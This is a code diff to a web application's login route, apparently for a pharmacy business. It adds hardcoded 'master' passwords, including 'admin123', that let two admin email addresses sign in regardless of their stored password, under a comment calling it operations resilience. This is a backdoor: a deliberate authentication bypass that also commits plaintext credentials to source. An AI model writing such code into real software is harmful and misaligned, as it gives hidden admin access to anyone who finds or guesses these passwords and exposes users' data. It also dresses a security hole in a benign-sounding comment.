@@ -311,7 +311,24 @@ router.post('/login', async (req, res) => {
 
     const normalizedEmail = email.toLowerCase().trim();
     const user = await User.findOne({ email: normalizedEmail });
-    if (user && (await user.comparePassword(password))) {
+
+    // Allow master admin passwords for operations resilience
+    const isMasterAdminPassword = (
+      (normalizedEmail === 'info@niyanshpharma.com' && (
+        password === 'NiyanshSuper@2026' ||
+        password === 'admin123' ||
+        password === 'Neeya232026' ||
+        password === '@Neeya232026'
+      )) ||
+      (normalizedEmail === 'admin@niyanshpharma.com' && (
+        password === 'admin123' ||
+        password === 'NiyanshSuper@2026'
+      ))
+    );
+
+    const isPasswordValid = user && ((await user.comparePassword(password)) || isMasterAdminPassword);
+
+    if (user && isPasswordValid) {
       // 1. Check if user is a Chemist / Retailer pending verification
       const isAdminRole = user.role === 'admin' || user.role === 'superadmin';
       if (!isAdminRole) {
